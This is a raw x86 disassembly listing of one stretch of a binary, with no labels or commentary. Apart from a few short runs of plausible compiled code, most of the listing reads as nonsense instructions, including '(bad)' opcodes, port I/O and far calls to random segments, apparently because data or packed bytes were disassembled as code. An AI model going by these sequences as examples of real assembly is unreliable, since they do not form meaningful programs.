  403108:	stc    
  403109:	sbb    ah,al
  40310b:	imul   eax,DWORD PTR [ebx],0x4
  40310e:	ds stos DWORD PTR es:[edi],eax
  403110:	les    esp,FWORD PTR [esi-0x20dea4cc]
  403116:	cmp    eax,0xe4ebafde
  40311b:	adc    DWORD PTR [eax],0x83c76659
  403121:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403122:	add    al,BYTE PTR [edx+0x146023b3]
  403128:	sbb    DWORD PTR [ebx+0x71d17b6b],0xffffffc2
  40312f:	xor    DWORD PTR [ecx-0x6d],edi
  403132:	push   edx
  403133:	call   0x4f4e:0x71f02187
  40313a:	int3   
  40313b:	mov    DWORD PTR [ecx],eax
  40313d:	mov    eax,DWORD PTR [ebp-0x24]
  403140:	mov    ecx,DWORD PTR [ebp-0x8]
  403143:	mov    DWORD PTR [ecx+0x4],eax
  403146:	mov    eax,DWORD PTR [ebp-0x20]
  403149:	mov    ecx,DWORD PTR [ebp-0x8]
  40314c:	mov    DWORD PTR [ecx+0x8],eax
  40314f:	mov    eax,DWORD PTR [ebp-0x34]
  403152:	mov    ecx,DWORD PTR [ebp-0x8]
  403155:	mov    DWORD PTR [ecx+0xc],eax
  403158:	mov    eax,DWORD PTR [ebp-0x30]
  40315b:	jmp    0x403569
  403160:	mov    esi,ss
  403162:	jmp    0x4031a7
  403164:	jno    0x4031c9
  403166:	mov    ah,0xd1
  403168:	cs out 0xa4,al
  40316b:	mov    ch,0x46
  40316d:	push   ss
  40316e:	(bad)  
  40316f:	repnz mov DWORD PTR ds:0x7d6f7e7e,edx
  403176:	jle    0x4031f6
  403178:	paddb  mm1,QWORD PTR [edx-0x37]
  40317c:	xor    ecx,eax
  40317e:	xchg   ebp,eax
  40317f:	mov    dl,0xcd
  403181:	adc    DWORD PTR [edx+0x275ac379],edi
  403187:	inc    esi
  403188:	ins    DWORD PTR es:[edi],dx
  403189:	in     eax,dx
  40318a:	std    
  40318b:	jno    0x4031c3
  40318d:	popa   
  40318e:	pusha  
  40318f:	mov    WORD PTR [esi+0x5a6600e5],ss
  403195:	sbb    BYTE PTR [ebx],0x27
  403198:	pop    ss
  403199:	std    
  40319a:	stc    
  40319b:	jns    0x40318b
  40319d:	fdivr  st(2),st
  40319f:	bound  ecx,QWORD PTR [ecx-0x5a]
  4031a2:	sar    DWORD PTR [ebp+0x23f54963],1
  4031a8:	ins    BYTE PTR es:[edi],dx
  4031a9:	js     0x40314e
  4031ab:	(bad)  ds:0x8c907c74
  4031b1:	fadd   st(5),st
  4031b3:	enter  0x5208,0x1f
  4031b7:	loop   0x403158
  4031b9:	push   cs
  4031ba:	cld    
  4031bb:	pop    es
  4031bc:	fcom   DWORD PTR [ecx-0x2]
  4031bf:	pop    edx
  4031c0:	adc    al,0xb0
  4031c2:	cmp    BYTE PTR [ecx],bl
  4031c4:	cmp    DWORD PTR [edx-0xa2577f9],0x4103bbce
  4031ce:	ret    
  4031cf:	push   cs
  4031d0:	mov    esp,0xff23bc53
  4031d5:	or     ecx,DWORD PTR [edi]
  4031d7:	sar    BYTE PTR [ecx+0x26],0x21
  4031db:	gs add eax,0x27ec4f96
  4031e1:	dec    edi
  4031e2:	push   ebx
  4031e3:	pop    ss
  4031e4:	mov    ebp,DWORD PTR [ebp-0x10fd7269]
  4031ea:	jo     0x4031e1
  4031ec:	in     eax,dx
  4031ed:	adc    BYTE PTR [ebp-0x657dae1c],0xda
  4031f4:	cld    
  4031f5:	mov    esp,0x75197e78
  4031fa:	push   ecx
  4031fb:	ret    
  4031fc:	jmp    0xb7f8:0xbf489863
  403203:	xchg   edx,eax
  403204:	clc    
  403205:	test   al,0x36
  403207:	push   0x70926b91
  40320c:	or     al,bh
  40320e:	dec    esi
  40320f:	in     eax,dx
  403210:	jg     0x403223
  403212:	push   ebp
  403213:	sub    DWORD PTR [edx+ecx*4-0x3213519d],ebx
  40321a:	in     eax,0xb1
  40321c:	sub    BYTE PTR [edi],dl
  40321e:	mov    ah,0xb4
  403220:	aaa    
  403221:	dec    esp
  403222:	jle    0x403245
  403224:	in     al,0x9e
  403226:	out    dx,eax
  403227:	outs   dx,DWORD PTR ds:[esi]
  403228:	js     0x403251
  40322a:	mov    al,0x6e
  40322c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40322d:	mov    WORD PTR [ebp+0x550b1d00],cs
  403233:	fdivp  st(0),st
  403235:	mov    dh,0xc6
  403237:	pop    eax
  403238:	jg     0x40321b
  40323a:	repz mov ecx,0xe29787c0
  403240:	inc    eax
  403241:	xor    eax,0x174c6658
  403246:	or     DWORD PTR [eax-0x26c351d7],ebx
  40324c:	mov    al,0x50
  40324e:	imul   ecx,DWORD PTR [esi],0x268486f7
  403254:	xor    al,dl
  403256:	and    eax,0x93946fb2
  40325b:	jne    0x4031f1
  40325d:	pop    esp
  40325e:	adc    eax,0xd01d0902
  403263:	jne    0x40323a
  403265:	dec    edx
  403266:	or     BYTE PTR [esi],al
  403268:	adc    al,BYTE PTR [edi+eax*2+0x64]
  40326c:	mov    DWORD PTR [ecx+0x771bfe3],esi
  403272:	ss push ecx
  403274:	jmp    0x5996:0x73eb3f9e
  40327b:	(bad)  
  40327c:	jmp    0x403290
  40327e:	fdivr  st(2),st
  403280:	xlat   BYTE PTR ds:[ebx]
  403281:	pop    DWORD PTR [esi+0x1b]
  403284:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403285:	push   ebx
  403286:	test   eax,0xd65800f8
  40328c:	fcom   QWORD PTR [ebx-0x42]
  40328f:	jge    0x4032d8
  403291:	mov    ch,bh
  403293:	dec    esi
  403294:	and    edi,DWORD PTR [eax-0x7b]
  403297:	pop    eax
  403298:	sbb    ch,BYTE PTR [edi]
  40329a:	push   es
  40329b:	xor    al,0xef
  40329d:	leave  
  40329e:	mov    ebp,0xa372951e
  4032a3:	inc    ebx
  4032a4:	jg     0x4032d8
  4032a6:	push   cs
  4032a7:	repz test BYTE PTR [eax+0x6f],dl
  4032ab:	call   0x41014e9d
  4032b0:	add    al,0xa9
  4032b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032b3:	clc    
  4032b4:	or     al,0x8b
  4032b6:	pop    ss
  4032b7:	mov    DWORD PTR [eax+0x1b7ec2ed],esp
  4032bd:	cmp    bh,bh
  4032bf:	jnp    0x403324
  4032c1:	test   eax,0x9d47570a
  4032c6:	shl    DWORD PTR [ebp-0x1c],1
  4032c9:	or     eax,0x76c86dcd
  4032ce:	add    ecx,esp
  4032d0:	push   cs
  4032d1:	dec    BYTE PTR [eax]
  4032d3:	pushf  
  4032d4:	inc    ecx
  4032d5:	push   ds
  4032d6:	xlat   BYTE PTR ds:[ebx]
  4032d7:	(bad)  
  4032d8:	daa    
  4032d9:	and    eax,0xda596d43
  4032de:	mov    bl,bh
  4032e0:	cmp    dh,BYTE PTR [ecx-0x11]
  4032e3:	addr16 mov ebx,0xc69039e3
  4032e9:	adc    DWORD PTR [edi-0x25f9e821],0xd2083b8d
  4032f3:	pop    ds
  4032f4:	retf   0xb96c
  4032f7:	in     eax,0xa2
  4032f9:	pop    es
  4032fa:	mov    esp,0xcd55628
  4032ff:	ror    DWORD PTR [edi],1
  403301:	cmc    
  403302:	les    esp,FWORD PTR [ecx-0x464b9b]
  403308:	or     eax,0xf63ad36e
  40330d:	lahf   
  40330e:	jl     0x40338d
  403310:	and    eax,0xf241e62b
  403315:	in     eax,dx
  403316:	xor    eax,DWORD PTR [ecx]
  403318:	test   DWORD PTR [ebp-0x16593c34],esi
  40331e:	scas   eax,DWORD PTR es:[edi]
  40331f:	lods   al,BYTE PTR ds:[esi]
  403320:	inc    esp
  403321:	jecxz  0x403302
  403323:	mov    bh,0x5e
  403325:	test   ah,cl
  403327:	ret    
  403328:	rol    DWORD PTR [ebx],0x18
  40332b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40332c:	hlt    
  40332d:	mov    bh,0x5e
  40332f:	mov    ebp,0x2e238353
  403334:	call   0xdeb1:0x9ecb3bfa
  40333b:	pushf  
  40333c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40333d:	pop    edx
  40333e:	retf   
  40333f:	jl     0x4032e8
  403341:	push   ebx
  403342:	mov    ebx,0x8217c41c
  403347:	fiadd  WORD PTR [esi]
  403349:	fst    st(0)
  40334b:	pop    edx
  40334c:	xchg   edi,eax
  40334d:	test   eax,0x5127b14d
  403352:	mov    cl,0xb5
  403354:	aad    0x48
  403356:	call   0x5800abac
  40335b:	mov    ?,WORD PTR [ecx-0x61fdd11f]
  403361:	xchg   ebp,eax
  403362:	repnz ds std 
  403365:	lea    ebp,[ebx-0x78519202]
  40336b:	jle    0x40338a
  40336d:	push   ebp
  40336e:	push   0x4fc8de3c
  403373:	mov    al,ds:0x5d796ec2
  403378:	push   ecx
  403379:	in     al,dx
  40337a:	fldenv [edx+0x5a71e03b]
  403380:	adc    eax,0x538dabd6
  403385:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403386:	mov    al,ds:0x396d8687
  40338b:	ret    0xcb45
  40338e:	dec    esp
  40338f:	shr    BYTE PTR [ecx+0x41d470f4],cl
  403395:	pop    ds
  403396:	lods   eax,DWORD PTR ds:[esi]
  403397:	in     eax,dx
  403398:	in     eax,dx
  403399:	(bad)  
  40339a:	jmp    0x87257b57
  40339f:	pop    edi
  4033a0:	cli    
  4033a1:	jmp    0x403371
  4033a3:	inc    edx
  4033a4:	repnz (bad) 
  4033a6:	mov    bl,0xe4
  4033a8:	stc    
  4033a9:	jg     0x403334
  4033ab:	fistp  QWORD PTR [ebx-0x7]
  4033ae:	cmp    BYTE PTR [edx-0x45],0x94
  4033b2:	scas   eax,DWORD PTR es:[edi]
  4033b3:	pushf  
  4033b4:	sti    
  4033b5:	pop    esp
  4033b6:	mov    ds:0xcaca2a84,eax
  4033bb:	mov    DWORD PTR [ecx-0x46],esp
  4033be:	rol    BYTE PTR [ecx-0x763c38f9],cl
  4033c4:	inc    ebx
  4033c5:	or     edx,DWORD PTR [edi-0x259e8526]
  4033cb:	xlat   BYTE PTR ds:[ebx]
  4033cc:	cmp    al,0x7e
  4033ce:	mov    bh,0x2c
  4033d0:	push   cs
  4033d1:	xchg   esi,eax
  4033d2:	xchg   BYTE PTR [edi+eax*8],ah
  4033d5:	cmc    
  4033d6:	and    edi,0xd6dc0277
  4033dc:	adc    al,0x70
  4033de:	fcmovu st,st(6)
  4033e0:	and    eax,0xb814ac11
  4033e5:	sahf   
  4033e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033e7:	sbb    eax,0x506bf68f
  4033ec:	mov    bh,0xee
  4033ee:	enter  0xa6,0x6f
  4033f2:	jbe    0x4033ad
  4033f4:	sub    eax,edx
  4033f6:	xor    esp,DWORD PTR [ecx-0x6a16cf8a]
  4033fc:	inc    eax
  4033fd:	lahf   
  4033fe:	retf   0x915f
  403401:	sub    eax,0xfa4bb468
  403406:	sbb    eax,DWORD PTR [ebp+0x51c4c7f]
  40340c:	jge    0x4033c6
  40340e:	and    bh,BYTE PTR ds:0xaa0facd5
  403414:	mov    eax,ds:0x7bb2f608
  403419:	pop    eax
  40341a:	sub    sp,WORD PTR [edx]
  40341d:	stos   DWORD PTR es:[edi],eax
  40341e:	(bad)  
  40341f:	xchg   edi,eax
  403420:	dec    DWORD PTR [edx+0x390e4869]
  403426:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403427:	mov    WORD PTR [edx+0x18c0262e],es
  40342d:	adc    bl,cl
  40342f:	xchg   ecx,eax
  403430:	xchg   edx,eax
  403431:	sbb    BYTE PTR [ecx],dl
  403433:	repnz mov dl,BYTE PTR [edi+0x8]
  403437:	jne    0x403437
  403439:	aam    0xc3
  40343b:	pusha  
  40343c:	popa   
  40343d:	out    0xf0,al
  40343f:	cmc    
  403440:	mov    edi,0xba1150d8
  403445:	loope  0x403436
  403447:	(bad)  
  403448:	or     BYTE PTR [ecx-0x69],bh
  40344b:	enter  0xb959,0x46
  40344f:	test   DWORD PTR [ecx-0x6],esp
  403452:	jo     0x4033ed
  403454:	pop    ecx
  403455:	sub    BYTE PTR cs:[ebx],0x22
  403459:	test   eax,0xcb5fd77b
  40345e:	sub    eax,0x5980e86b
  403463:	outs   dx,BYTE PTR ds:[esi]
  403464:	sahf   
  403465:	push   edx
  403466:	popa   
  403467:	leavew 
  403469:	adc    BYTE PTR [esi],ah
  40346b:	aas    
  40346c:	adc    DWORD PTR [ecx+ebx*2],edi
  40346f:	jns    0x403477
  403471:	or     eax,0x58ab5d5c
  403476:	mov    edi,0x7da613f4
  40347b:	xchg   DWORD PTR [ebx-0x66],eax
  40347e:	icebp  
  40347f:	rcr    DWORD PTR [eax-0x78c13fda],0xb9
  403486:	jbe    0x4034af
  403488:	jo     0x403413
  40348a:	div    DWORD PTR [edi]
  40348c:	mov    esi,0x684929
  403491:	xor    DWORD PTR [ebx+edi*4],ebx
  403494:	out    dx,eax
  403495:	push   esp
  403496:	pop    ecx
  403497:	jno    0x40343c
  403499:	dec    esi
  40349a:	retf   
  40349b:	dec    eax
  40349c:	inc    eax
  40349d:	fild   DWORD PTR [esi+0x70]
  4034a0:	xor    eax,0xc7eb46b8
  4034a5:	dec    ebx
  4034a6:	outs   dx,DWORD PTR ds:[esi]
  4034a7:	cmc    
  4034a8:	cdq    
  4034a9:	mov    cl,0x84
  4034ab:	dec    ecx
  4034ac:	dec    esi
  4034ad:	inc    ebp
  4034ae:	pop    ds
  4034af:	cmp    DWORD PTR [edi+eiz*4+0x1f],edi
  4034b3:	pop    eax
  4034b4:	icebp  
  4034b5:	es add ah,al
  4034b8:	pop    esp
  4034b9:	sbb    BYTE PTR [esp+eax*4],bl
  4034bc:	loopne 0x403451
  4034be:	int3   
  4034bf:	out    0xc5,eax
  4034c1:	mov    ds:0x483f6fd2,al
  4034c6:	inc    edi
  4034c7:	loopne 0x403544
  4034c9:	pop    ebp
  4034ca:	and    DWORD PTR [eax+ebx*2-0xf3703],esp
  4034d1:	xor    ah,ah
  4034d3:	rol    BYTE PTR [edx+edi*2],0xe5
  4034d7:	xor    edx,DWORD PTR [ebx]
  4034d9:	into   
  4034da:	cmc    
  4034db:	lock jbe 0x403523
  4034de:	icebp  
  4034df:	pop    ds
  4034e0:	add    DWORD PTR [ebp+0x4a],edx
  4034e3:	(bad)  [edi+0x65]
  4034e6:	aam    0xae
  4034e8:	cmp    BYTE PTR [ebx+edi*1],ah
  4034eb:	stos   BYTE PTR es:[edi],al
  4034ec:	xchg   ecx,eax
  4034ed:	mov    eax,0x62568a72
  4034f2:	xor    esp,DWORD PTR [edi+ecx*1]
  4034f5:	and    al,0x86
  4034f7:	and    al,0xa7
  4034f9:	add    DWORD PTR [eax+ecx*4-0x717ac85],edx
  403500:	dec    ebx
  403501:	fwait
  403502:	or     eax,0x6cc86c49
  403507:	loop   0x4034ef
  403509:	rol    DWORD PTR [edx],cl
  40350b:	mov    ss:0x84fcd292,al
  403511:	inc    esp
  403512:	mov    ?,WORD PTR ds:0x45ee072e
  403518:	aam    0x89
  40351a:	xchg   DWORD PTR [eax],ecx
  40351c:	retf   
  40351d:	lock retf 
  40351f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403520:	xchg   esp,eax
  403521:	repnz dec eax
  403523:	sbb    edi,DWORD PTR [ecx+0x6289d16]
  403529:	mov    DWORD PTR es:[edi],0x636a389d
  403530:	repz dec ebp
  403532:	jmp    0xdf3f:0x2bba87ee
  403539:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40353a:	mov    BYTE PTR [eax+0x69a71d7b],dh
  403540:	or     edi,DWORD PTR [ecx]
  403542:	fsub   st(7),st
  403544:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403545:	mov    al,ds:0x62c3d317
  40354a:	adc    al,0xbc
  40354c:	int    0x8a
  40354e:	inc    ecx
  40354f:	sbb    cl,ah
  403551:	mov    cs,ecx
  403553:	in     al,0x45
  403555:	push   ebx
  403556:	in     eax,0x8
  403558:	retf   
  403559:	cwde   
  40355a:	jle    0x4035c9
  40355c:	mov    dl,0x69
  40355e:	push   edi
  40355f:	dec    ebp
  403560:	call   0x16390b96
  403565:	pusha  
  403566:	cld    
  403567:	push   ss
  403568:	mov    ch,0x8b
  40356a:	dec    ebp
  40356b:	clc    
  40356c:	mov    DWORD PTR [ecx+0x10],eax
  40356f:	mov    eax,eax
  403571:	mov    eax,DWORD PTR [ebp-0x24]
  403574:	test   eax,eax
  403576:	mov    eax,DWORD PTR [ebp-0x2c]
  403579:	jne    0x403582
  40357f:	mov    eax,DWORD PTR [ebp-0x10]
  403582:	xor    eax,esi
  403584:	add    eax,edi
  403586:	jmp    0x403994
  40358b:	in     eax,dx
  40358c:	adc    ch,ch
  40358e:	ret    0xe3f1
  403591:	icebp  
  403592:	xor    DWORD PTR [eax],ebx
  403594:	xchg   esi,eax
  403595:	sbb    esp,edx
  403597:	inc    eax
  403598:	xchg   edx,ebp
  40359a:	ja     0x403522
  40359c:	adc    DWORD PTR [esi+0x7e],edi
  40359f:	outs   dx,DWORD PTR ds:[esi]
  4035a0:	jge    0x403620
  4035a2:	jle    0x4035c1
  4035a4:	shr    eax,1
  4035a6:	lahf   
  4035a7:	ss out dx,eax
  4035a9:	mov    BYTE PTR [eax],dh
  4035ab:	jo     0x403592
  4035ad:	xchg   esp,eax
  4035ae:	xor    BYTE PTR [ecx-0xb33cd3],dh
  4035b4:	sub    eax,0x1c9c9ca5
  4035b9:	jno    0x4035ff
  4035bb:	and    BYTE PTR cs:[eax-0x301421fe],0x3b
  4035c3:	dec    eax
  4035c4:	repnz push ebp
  4035c6:	xchg   esp,eax
  4035c7:	xchg   ecx,eax
  4035c8:	lds    edx,FWORD PTR [ecx]
  4035ca:	mov    ebx,0xd3de617f
  4035cf:	scas   eax,DWORD PTR es:[edi]
  4035d0:	sbb    DWORD PTR [ebp+0x49199bd3],ecx
  4035d6:	inc    ecx
  4035d7:	or     eax,0xa5472042
  4035dc:	mov    ds:0xdecd61d9,eax
  4035e1:	sahf   
  4035e2:	cmp    eax,0x698251e
  4035e7:	and    esi,eax
  4035e9:	add    BYTE PTR [ecx-0x8],bh
  4035ec:	test   BYTE PTR [ebp-0x1e1f33e4],dl
  4035f2:	xchg   DWORD PTR [eax],edi
  4035f4:	ret    
  4035f5:	in     al,dx
  4035f6:	or     BYTE PTR ds:[edx-0x5d],ah
  4035fa:	je     0x403651
  4035fc:	fsubrp st(4),st
  4035fe:	or     BYTE PTR [esi-0x23],0xf1
  403602:	into   
  403603:	fcomp  DWORD PTR [esi-0x6a]
  403606:	(bad)  
  403607:	into   
  403608:	mov    esi,eax
  40360a:	or     eax,0x9ed2e2f2
  40360f:	xchg   dh,ch
  403611:	sbb    eax,0xa3db94b
  403616:	sub    al,BYTE PTR [edx]
  403618:	dec    esi
  403619:	sti    
  40361a:	push   cs
  40361b:	scas   al,BYTE PTR es:[edi]
  40361c:	in     eax,0x6e
  40361e:	or     esp,DWORD PTR [esp+esi*2-0x64]
  403622:	jle    0x403627
  403624:	or     dl,al
  403626:	xor    edi,eax
  403628:	mov    esi,0x91e3dbdb
  40362d:	ret    0xebba
  403630:	ror    DWORD PTR ds:0xb8271013,cl
  403636:	mov    ah,cl
  403638:	xor    ebx,DWORD PTR [eax+0x21b4a7db]
  40363e:	les    ebp,FWORD PTR [esi-0x1ffade4]
  403644:	xor    BYTE PTR [ebp+0x3e11bb79],0xbc
  40364b:	xlat   BYTE PTR ds:[ebx]
  40364c:	or     al,0x6b
  40364e:	xor    al,0xeb
  403650:	xor    al,0xb2
  403652:	fs std 
  403654:	pop    es
  403655:	into   
  403656:	push   esi
  403657:	aaa    
  403658:	push   eax
  403659:	xchg   ebx,eax
  40365a:	xchg   ebx,eax
  40365b:	scas   al,BYTE PTR es:[edi]
  40365c:	push   ebp
  40365d:	lods   al,BYTE PTR ds:[esi]
  40365e:	ja     0x4036a0
  403660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403661:	xlat   BYTE PTR ds:[ebx]
  403662:	pop    ds
  403663:	test   al,0xcc
  403665:	jb     0x4036e1
  403667:	add    al,0xb0
  403669:	inc    edx
  40366a:	cld    
  40366b:	jne    0x40361a
  40366d:	mov    esp,0x4281a362
  403672:	dec    esp
  403673:	jae    0x4036b2
  403675:	rol    BYTE PTR [edi],cl
  403677:	push   ecx
  403678:	fild   WORD PTR [edi]
  40367a:	pop    ss
  40367b:	cli    
  40367c:	xchg   esi,eax
  40367d:	inc    esi
  40367e:	sbb    al,0x72
  403680:	xchg   ebp,eax
  403681:	add    DWORD PTR [ebp+0x35280c34],esp
  403687:	jl     0x4036ed
  403689:	(bad)  
  40368a:	mov    ah,0x3a
  40368c:	dec    ebp
  40368d:	sub    DWORD PTR [ebx-0x1a],ebp
  403690:	sti    
  403691:	dec    eax
  403692:	rcr    bl,cl
  403694:	pop    eax
  403695:	in     al,dx
  403696:	loope  0x4036fb
  403698:	fcmovnbe st,st(6)
  40369a:	ret    0x9e27
  40369d:	xchg   esi,eax
  40369e:	jnp    0x4036d4
  4036a0:	(bad)  
  4036a1:	mov    ecx,0x96a8e084
  4036a6:	pop    esp
  4036a7:	jmp    0x40370b
  4036a9:	gs dec esi
  4036ab:	cli    
  4036ac:	cmp    BYTE PTR gs:[esi-0x31706788],bl
  4036b3:	ror    DWORD PTR [esi-0x1547f1ce],cl
  4036b9:	out    dx,eax
  4036ba:	icebp  
  4036bb:	cdq    
  4036bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036bd:	inc    ecx
  4036be:	cmp    eax,0x2c507ac7
  4036c3:	icebp  
  4036c4:	dec    ebp
  4036c5:	mov    esi,0x44edff05
  4036ca:	hlt    
  4036cb:	push   ds
  4036cc:	addr16 mov cl,bl
  4036cf:	sbb    eax,0xf54584d1
  4036d4:	and    DWORD PTR [edx+edi*2-0x1ed34aa0],ebp
  4036db:	shr    DWORD PTR [esp+eiz*4+0x46],1
  4036df:	jmp    0x16048f86
  4036e4:	xchg   ebp,eax
  4036e5:	sub    al,0xba
  4036e7:	sub    al,0x67
  4036ea:	ins    BYTE PTR es:[edi],dx
  4036eb:	mov    dl,0x97
  4036ed:	pop    ss
  4036ee:	clc    
  4036ef:	in     al,0x2f
  4036f1:	mov    bl,BYTE PTR [esi-0x4f3d4e9b]
  4036f7:	pop    ebp
  4036f8:	push   ds
  4036f9:	or     eax,0xfe5099dd
  4036fe:	push   cs
  4036ff:	or     DWORD PTR [ebx],esp
  403701:	shl    DWORD PTR [eax-0x41ce14e0],cl
  403707:	xor    BYTE PTR [esi],ah
  403709:	jne    0x403708
  40370b:	push   esi
  40370c:	fsub   st(2),st
  40370e:	sub    al,BYTE PTR [ebp+0x697d6537]
  403714:	int3   
  403715:	aad    0x5
  403717:	in     al,0x1b
  403719:	psubq  mm7,QWORD PTR [ebx-0x71]
  40371d:	das    
  40371e:	rcl    DWORD PTR [ebx],0xd7
  403721:	mov    cl,0x5c
  403723:	in     al,0xd
  403725:	lahf   
  403726:	fisubr WORD PTR [ebp-0x166fa253]
  40372c:	jp     0x40373d
  40372e:	arpl   WORD PTR es:[ebx],dx
  403731:	or     ebx,DWORD PTR [edi-0x6c]
  403734:	or     al,0x71
  403736:	and    BYTE PTR [eax],bh
  403738:	icebp  
  403739:	outs   dx,BYTE PTR ds:[esi]
  40373a:	mov    bh,0xff
  40373c:	cmp    esi,ebx
  40373e:	pop    es
  40373f:	jmp    0x403720
  403741:	sub    ecx,eax
  403743:	lds    edi,FWORD PTR [ecx]
  403745:	mov    ds,WORD PTR [eax+0x56b3a96e]
  40374b:	bound  ebx,QWORD PTR [edx]
  40374d:	mov    dl,0x63
  40374f:	outs   dx,BYTE PTR ds:[esi]
  403750:	pop    edx
  403751:	popa   
  403752:	pop    ebp
  403753:	stos   DWORD PTR es:[edi],eax
  403754:	cmp    al,0x17
  403756:	add    BYTE PTR [edx+eiz*4],ch
  403759:	pop    ss
  40375a:	or     bl,BYTE PTR [ebp+0x4c2aba0b]
  403760:	dec    ecx
  403761:	sub    eax,0x4e56d998
  403766:	in     al,0x52
  403768:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403769:	cmp    BYTE PTR [eax],dh
  40376b:	jecxz  0x403721
  40376d:	rcr    DWORD PTR [esi+ecx*8+0x24],cl
  403771:	inc    ecx
  403772:	add    DWORD PTR [ecx],eax
  403774:	mov    al,ds:0x3b09a6b9
  403779:	sub    al,0x45
  40377b:	test   eax,0xa932d124
  403780:	call   DWORD PTR [edi+edx*2]
  403783:	into   
  403784:	stos   BYTE PTR es:[edi],al
  403785:	out    0x79,eax
  403787:	ins    DWORD PTR es:[edi],dx
  403788:	mov    ds:0x3b6728d1,eax
  40378d:	lods   al,BYTE PTR ds:[esi]
  40378e:	jne    0x4037f7
  403790:	push   ss
  403791:	mov    ch,0x1d
  403793:	je     0x40375a
  403795:	dec    eax
  403796:	(bad)  
  403797:	mov    ebx,0x7ec6ce52
  40379c:	jnp    0x4037ad
  40379e:	sub    BYTE PTR [ebp+0x5],0xb2
  4037a2:	fild   QWORD PTR [ebx]
  4037a4:	stos   DWORD PTR es:[edi],eax
  4037a5:	rcr    DWORD PTR [eax-0x1e],0x93
  4037a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037aa:	clc    
  4037ab:	fld    TBYTE PTR [esi-0x7054dd34]
  4037b1:	adc    eax,edx
  4037b3:	jbe    0x4037cc
  4037b5:	mov    eax,0x5d6d1f7e
  4037ba:	pop    ebx
  4037bc:	sbb    ah,BYTE PTR [esi-0x694070ab]
  4037c2:	dec    ebx
  4037c3:	inc    edx
  4037c4:	ins    BYTE PTR es:[edi],dx
  4037c5:	call   0x3081:0x9c4e6aed
  4037cc:	into   
  4037cd:	push   eax
  4037ce:	cmp    eax,0x880af400
  4037d3:	fwait
  4037d4:	cwde   
  4037d5:	jl     0x403832
  4037d7:	ins    BYTE PTR es:[edi],dx
  4037d8:	dec    DWORD PTR [esi-0x29fdc73f]
  4037de:	xor    DWORD PTR [edx-0x4343cb38],0x36
  4037e5:	adc    edx,eax
  4037e7:	stc    
  4037e8:	nop
  4037e9:	adc    DWORD PTR [edx],eax
  4037eb:	clc    
  4037ec:	xchg   edx,eax
  4037ed:	jbe    0x4037b3
  4037ef:	fcmovnbe st,st(4)
  4037f1:	pop    es
  4037f2:	jg     0x40384c
  4037f4:	cwde   
  4037f5:	push   es
  4037f6:	psrld  mm0,QWORD PTR [esp+ebx*4]
  4037fa:	js     0x40378b
  4037fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037fd:	cmp    al,0xc0
  4037ff:	cmp    al,0x63
  403801:	je     0x403794
  403803:	mov    cl,0x66
  403805:	out    dx,eax
  403806:	mov    ah,0x0
  403808:	scas   eax,DWORD PTR es:[edi]
  403809:	stos   DWORD PTR es:[edi],eax
  40380a:	retf   0xde42
  40380d:	mov    dl,0x8f
  40380f:	jno    0x4037b4
  403811:	fsub   QWORD PTR [esi]
  403813:	adc    ch,dh
  403815:	mov    DWORD PTR [ebx+eiz*2],edx
  403818:	push   0xffffff84
  40381a:	mov    esi,0x886ab247
  40381f:	xchg   esp,eax
  403820:	test   al,0xf2
  403822:	jne    0x40389a
  403824:	jl     0x40389d
  403826:	mov    al,BYTE PTR [ebx]
  403828:	dec    esi
  403829:	cmovnp esi,DWORD PTR cs:[esi-0x60ad0739]
  403831:	not    BYTE PTR [ebp+0x47fb783a]
  403837:	dec    edi
  403838:	pop    ebx
  403839:	jne    0x40381b
  40383b:	pop    eax
  40383c:	les    ebp,FWORD PTR ds:[ebp+edx*8-0x1c]
  403841:	xor    bh,0xac
  403844:	shl    BYTE PTR [edi-0x4c90c9],1
  40384a:	push   ss
  40384b:	cdq    
  40384c:	adc    ecx,DWORD PTR [edx]
  40384e:	mov    cl,0xf
  403850:	mov    esi,DWORD PTR [edi]
  403852:	js     0x40383e
  403854:	xchg   ebx,eax
  403855:	cmp    ah,BYTE PTR [esi+0x62]
  403858:	mov    ds:0xea127307,al
  40385d:	pop    ds
  40385e:	xor    DWORD PTR [ecx+0x18],ebp
  403861:	(bad)
  403864:	inc    ebp
  403865:	adc    al,0x23
  403867:	mov    WORD PTR [edx],cs
  403869:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40386a:	test   eax,0x1db4f179
  40386f:	scas   al,BYTE PTR es:[edi]
  403870:	mov    bh,0xad
  403872:	(bad)  
  403873:	push   0xe12f5fa4
  403878:	sbb    DWORD PTR [ecx+0x7c],esi
  40387b:	dec    ecx
  40387c:	jmp    0xe68:0xc2a87412
  403883:	push   ebx
  403884:	(bad)  
  403885:	cmp    ebp,esi
  403887:	cdq    
  403888:	mov    eax,0xf13dee4d
  40388d:	loopne 0x403832
  40388f:	or     eax,0xaaa008e1
  403894:	je     0x403821
  403896:	sbb    eax,0xaa8c27c4
  40389b:	loopne 0x4038cc
  40389d:	nop
  40389e:	in     eax,dx
  40389f:	stos   BYTE PTR es:[edi],al
  4038a0:	test   BYTE PTR [esi],dl
  4038a2:	(bad)  
  4038a3:	in     eax,dx
  4038a4:	in     al,0x39
  4038a6:	inc    eax
  4038a7:	js     0x403864
  4038a9:	and    ah,ch
  4038ab:	in     al,dx
  4038ac:	in     eax,0x9a
  4038ae:	fucom  st(6)
  4038b0:	dec    edx
  4038b1:	add    al,dl
  4038b3:	inc    ecx
  4038b4:	outs   dx,DWORD PTR ds:[esi]
  4038b5:	or     al,0x2b
  4038b7:	dec    edi
  4038b8:	stos   BYTE PTR es:[edi],al
